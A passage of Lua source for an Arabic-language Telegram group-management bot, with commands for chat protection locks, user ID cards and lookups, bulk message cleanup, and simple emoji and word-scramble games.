send(msg.chat_id_, msg.id_,"*✦┇الصوره معطله*") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_,msg.id_,result.photos_[0].sizes_[1].photo_.persistent_id_,"✦┇عدد صورك ↜ | "..result.total_count_.." | 📸")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك')
end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == 'تفعيل الحمايه' and msg.reply_to_message_id_ == 0 and Addictive(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'✦┇عـليك الاشـتࢪاك في قنـاة البـوت اولآ . \n ✦┇قنـاة البـوت ↜  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id..'lock:tagrvrbot'..msg.chat_id_,true)   
list ={"lock:Neverland:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم تفعيل الحمايه بنجاح") 
return false
end,nil)   
end
if text == 'تعطيل الحمايه' and msg.reply_to_message_id_ == 0 and Addictive(msg) then   
database:del(bot_id..'lock:tagrvrbot'..msg.chat_id_)   
list ={"lock:Neverland:kick","lock:user:name","lock:Link","lock:forward","lock:Sticker","lock:Animation","lock:Video","lock:Fshar","Bot:Id:Photo","lock:Audio","lock:vico","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
Reply_Status(msg,msg.sender_user_id_,"lock","✦┇تم تعطيل الحمايه بنجاح") 
return false
end,nil)   
end

if text == 'تفعيل الايدي' and Owner(msg) then 
  if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id..'Neverland:Lock:ID:Bot'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الايدي') 
end
if text == 'تعطيل الايدي' and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id..'Neverland:Lock:ID:Bot'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'✦┇تم تعطيل الايدي') 
end
if text == 'تفعيل الايدي بالصوره' and Owner(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:del(bot_id..'Neverland:Lock:ID:Bot:Photo'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'✦┇تم تفعيل الايدي بالصوره') 
end
if text == 'تعطيل الايدي بالصوره' and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:set(bot_id..'Neverland:Lock:ID:Bot:Photo'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'✦┇تم تعطيل الايدي بالصوره') 
end
if text == 'تعين الايدي' and Owner(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*> عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
database:setex(bot_id.."Neverland:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
✦┇ارسل الان النص
✦┇يمكنك اضافه :
✦┇#username > اسم المستخدم
✦┇#msgs > عدد الرسائل
✦┇#photos > عدد الصور
✦┇#id > ايدي المستخدم
✦┇#auto > نسبة التفاعل
✦┇#stast > رتبة المستخدم 
✦┇#edit > عدد السحكات
✦┇#game > عدد المجوهرات
✦┇#AddMem > عدد الجهات
✦┇#Description > تعليق الصوره
✦┇#custom > اللقب
✦┇#bio > البايو
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'تغير الايدي' and Owner(msg) then 
local List = {
[[
[+] iD : {#id}
[+] User: {#username}
[+] Msgs: {#msgs}
[+] Stast : {#stast}
— — — —
]],
[[
- ᴜѕʀ: #username ঌ.
- ᴍѕɢ: #msgs  ঌ.
- ѕᴛᴀ: #stast  ঌ.
- ɪᴅ: #id ঌ.
]],
[[
✦┇Msgs : #msgs.
✦┇ID : #id.
✦┇Stast : #stast.
✦┇UserName : #username.
]],
[[
ᯓ 𝟔𝟔𝟔𖡋 #username 
ᯓ 𝟔𝟔𝟔𖡋 #stast  
ᯓ 𝟔𝟔𝟔𖡋 #id  
ᯓ 𝟔𝟔𝟔𖡋 #msgs  
ᯓ 𝟔𝟔𝟔𖡋 #game
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]]}
local Text_Rand = List[math.random(#List)]
database:set(bot_id.."Neverland:Klesh:Id:Bot"..msg.chat_id_,Text_Rand)
send(msg.chat_id_, msg.id_,'✦┇تم تغير الايدي ارسل ايدي لرؤيته')
end
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if Owner(msg) then
database:del(bot_id.."Neverland:Klesh:Id:Bot"..msg.chat_id_)
send(msg.chat_id_, msg.id_, '✦┇تم ازالة كليشة الايدي ')
end
return false  
end 

if database:get(bot_id.."Neverland:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"✦┇تم الغاء تعين الايدي") 
database:del(bot_id.."Neverland:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."Neverland:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
database:set(bot_id.."Neverland:Klesh:Id:Bot"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'✦┇تم تعين الايدي')    
end

if text == 'ايدي' and tonumber(msg.reply_to_message_id_) == 0 and not database:get(bot_id..'Neverland:Lock:ID:Bot'..msg.chat_id_) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*\n✦┇عذࢪاَ يڪلبي\n✦┇عليڪ الاشتࢪاڪ في قناه البوت\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\n*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if not database:sismember(bot_id..'Neverland:Spam:Group'..msg.sender_user_id_,text) then
database:sadd(bot_id.."Neverland:Spam:Group"..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Alsh,success) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'منشئ'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'ادمن' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end

if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'لا يوجد ' 
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = msg.sender_user_id_
local getcustomY = getcustom(msg,msg)
local getbioY = getbio(msg.sender_user_id_)
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Neverland:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Total_Photp = (Alsh.total_count_ or 0)
local Texting = {
'مو بشر حلغوم🍼🎀. ',
"فديت الصاك محح💞🍇 . ",
"فـدشـي عمـي💞🍇. ",
"دغـيرهـا شبـي هـاذ 💞🍇. ",
"شهل الگيمر 💞🍇. ",
"شهل الصوره تخمبش 💞🍇. ",
"فديت الحلو 💞 🍇. ",
"بـبكن حـلك 💞🍇. ",
}
local Description = Texting[math.random(#Texting)]
local get_id = database:get(bot_id.."Neverland:Klesh:Id:Bot"..msg.chat_id_) or database:get(bot_id.."Neverland:KleshIDALLBOT")
if not database:get(bot_id..'Neverland:Lock:ID:Bot:Photo'..msg.chat_id_) then
if Alsh.photos_[0] then
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#custom',getcustomY) 
local get_id = get_id:gsub('#id',Id) 
local get_id  = get_id:gsub('#bio',getbioY) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(get_id)..'&photo='..Alsh.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=msg.sender_user_id_.."/ideengphoto"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=msg.sender_user_id_.."/idearpphoto"},
},
}
local msg_id = msg.id_/2097152/0.5
local texte = '✦┇'..Description..'\n✦┇يـــديك : '..Id..' .\n✦┇يــوزرك : '..UserName_User..' .\n✦┇مــوقعــك : '..Status_Gps..' .\n✦┇رســائــلك : '..NumMsg..' .\n✦┇تفــاعــلك : '..TotalMsg..' .\n✦┇الالعـــاب : '..Num_Games..' .\n✦┇البايو : '..getbioY..''
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(texte)..'&photo='..Alsh.photos_[0].sizes_[1].photo_.persistent_id_..'&reply_to_message_id='..msg_id..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
else
local texte = '\n✦┇ايديك : '..Id..'\n✦┇يوزرك : ['..UserName_User..']\n✦┇موقعك : '..Status_Gps..'\n✦┇رسائلك : '..NumMsg..' \n✦┇تفاعلك : '..TotalMsg..'\n✦┇الالعاب : '..Num_Games..'.\n✦┇البايو : '..getbioY..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
else
if get_id then
local get_id = get_id:gsub('#AddMem',Add_Mem) 
local get_id = get_id:gsub('#id',Id) 
local get_id  = get_id:gsub('#bio',getbioY) 
local get_id = get_id:gsub('#username',UserName_User) 
local get_id = get_id:gsub('#msgs',NumMsg) 
local get_id = get_id:gsub('#edit',message_edit) 
local get_id = get_id:gsub('#stast',Status_Gps) 
local get_id = get_id:gsub('#auto',TotalMsg) 
local get_id = get_id:gsub('#Description',Description) 
local get_id = get_id:gsub('#game',Num_Games) 
local get_id = get_id:gsub('#photos',Total_Photp) 
local texte = '['..get_id..']'
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown")
else
local texte = '\n↜ ايديك : '..Id..'\n↜ يوزرك : ['..UserName_User..']\n↜ موقعك : '..Status_Gps..'\n↜ رسائلك : '..NumMsg..' \n↜ تفاعلك : '..TotalMsg..'\n↜ الالعاب : '..Num_Games..'\n↜ البايو : '..getbioY..''
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ᴇɴɢʟɪsʜ', callback_data=msg.sender_user_id_.."/ideeng"},{text = 'ᴀʀᴀʙɪᴄ', callback_data=msg.sender_user_id_.."/idearp"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(texte).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end,nil)   
end,nil)   
end,nil)   
end
end


if text == 'تعطيل التنظيف' and BasicConstructor(msg) then   
if database:get(bot_id..'Lock:delmsg'..msg.chat_id_)  then
database:del(bot_id..'Lock:delmsg'..msg.chat_id_) 
Text = '\n✦┇تم تعطيل التنظيف' 
else
Text = '\n✦┇بالتاكيد تم تعطيل التنظيف'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل التنظيف' and BasicConstructor(msg) then  
if not database:get(bot_id..'Lock:delmsg'..msg.chat_id_)  then
database:set(bot_id..'Lock:delmsg'..msg.chat_id_,true) 
Text = '\n✦┇تم تفعيل التنظيف' 
else
Text = '\n✦┇بالتاكيد تم تفعيل التنظيف'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and text:match('^تنظيف (%d+)$') and Constructor(msg) and database:get(bot_id..'Lock:delmsg'..msg.chat_id_) then                
if not database:get(bot_id..'Neverland:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
send(msg.chat_id_, msg.id_,'✦┇لا تستطيع تنضيف اكثر من *~ 1000* رساله') 
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576
end
send(msg.chat_id_, msg.id_,'✦┇تم تنظيف *~ '..Number..'* رساله .')  
database:setex(bot_id..'Neverland:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end


if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 and not database:get(bot_id..'Neverland:Lock:ID:Bot'..msg.chat_id_) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
function Function_Neverland(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.first_name_ == false then
send(msg.chat_id_, msg.id_,'✦┇الحساب محذوف لا توجد معلوماته ')
return false
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'*✦┇ايديه - '..Id..'\n✦┇رسائله - '..NumMsg..'\n✦┇معرفه - ['..UserName_User..']\n✦┇تفاعله - '..TotalMsg..'\n✦┇رتبته - '..Status_Gps..'\n✦┇تعديلاته - '..message_edit..'\n✦┇جهاته - '..Add_Mem..'\n✦┇نوع الكشف - بالرد \n*') 
end,nil)   
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Neverland, nil)
return false
end

if text and text:match("^كشف @(.*)$")  and not database:get(bot_id..'Neverland:Lock:ID:Bot'..msg.chat_id_) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local username = text:match("^كشف @(.*)$") 
function Function_Neverland(extra, result, success)
if result.id_ then
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'لا يوجد'
end
local Id = data.id_
local NumMsg = database:get(bot_id..'Neverland:messageUser'..msg.chat_id_..':'..data.id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Neverland:message_edit'..msg.chat_id_..data.id_) or 0
local Num_Games = database:get(bot_id.."Neverland:Msg_User"..msg.chat_id_..":"..data.id_) or 0
local Add_Mem = database:get(bot_id.."Neverland:Add:Memp"..msg.chat_id_..":"..data.id_) or 0
send(msg.chat_id_, msg.id_,'*✦┇ايديه - '..Id..'\n✦┇رسائله - '..NumMsg..'\n✦┇معرفه - ['..UserName_User..']\n✦┇تفاعله - '..TotalMsg..'\n✦┇رتبته - '..Status_Gps..'\n✦┇تعديلاته - '..message_edit..'\n✦┇جهاته - '..Add_Mem..'\n✦┇نوع الكشف - بالمعرف \n*') 
end,nil)   
else
send(msg.chat_id_, msg.id_,'✦┇لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Neverland, nil)
return false
end
if text == "سمايلات" or text == "سمايل" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Neverland:Set:Sma"..msg.chat_id_)
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","??","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🍵","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","??","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","✦┇","🎗","🏵","✦┇","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","🇮🇶","⚔","🛡","🔮","🌡","💣","✦┇","📍","📓","📗","✦┇","📅","📪","✦┇","✦┇","📭","⏰","📺","🎚","☎️","✦┇"}
SM = Random[math.random(#Random)]
database:set(bot_id.."Neverland:Random:Sm"..msg.chat_id_,SM)
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Random:Sm"..msg.chat_id_) or "").."" and not database:get(bot_id.."Neverland:Set:Sma"..msg.chat_id_) then
if not database:get(bot_id.."Neverland:Set:Sma"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ سمايل , سمايلات }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Sma"..msg.chat_id_,true)
return false
end 
if text == "الاسرع" or text == "ترتيب" then
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Neverland:Speed:Tr"..msg.chat_id_)
KlamSpeed = {"سحور","سياره","استقبال","قنفه","ايفون","بزونه","مطبخ","كرستيانو","دجاجه","مدرسه","الوان","غرفه","ثلاجه","كهوه","سفينه","العراق","محطه","طياره","رادار","منزل","مستشفى","كهرباء","تفاحه","اخطبوط","سلمون","فرنسا","برتقاله","تفاح","مطرقه","بتيته","لهانه","شباك","باص","سمكه","ذباب","تلفاز","حاسوب","انترنيت","ساحه","جسر"};
name = KlamSpeed[math.random(#KlamSpeed)]
database:set(bot_id.."Neverland:Klam:Speed"..msg.chat_id_,name)
name = string.gsub(name,"سحور","س ر و ح")
name = string.gsub(name,"سياره","ه ر س ي ا")
name = string.gsub(name,"استقبال","ل ب ا ت ق س ا")
name = string.gsub(name,"قنفه","ه ق ن ف")
name = string.gsub(name,"ايفون","و ن ف ا")
name = string.gsub(name,"بزونه","ز و ه ن")
name = string.gsub(name,"مطبخ","خ ب ط م")
name = string.gsub(name,"كرستيانو","س ت ا ن و ك ر ي")
name = string.gsub(name,"دجاجه","ج ج ا د ه")
name = string.gsub(name,"مدرسه","ه م د ر س")
name = string.gsub(name,"الوان","ن ا و ا ل")
name = string.gsub(name,"غرفه","غ ه ر ف")
name = string.gsub(name,"ثلاجه","ج ه ت ل ا")
name = string.gsub(name,"كهوه","ه ك ه و")
name = string.gsub(name,"سفينه","ه ن ف ي س")
name = string.gsub(name,"العراق","ق ع ا ل ر ا")
name = string.gsub(name,"محطه","ه ط م ح")
name = string.gsub(name,"طياره","ر ا ط ي ه")
name = string.gsub(name,"رادار","ر ا ر ا د")
name = string.gsub(name,"منزل","ن ز م ل")
name = string.gsub(name,"مستشفى","ى ش س ف ت م")
name = string.gsub(name,"كهرباء","ر ب ك ه ا ء")
name = string.gsub(name,"تفاحه","ح ه ا ت ف")
name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"بتيته","ب ت ت ي ه")
name = string.gsub(name,"لهانه","ه ن ل ه ل")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
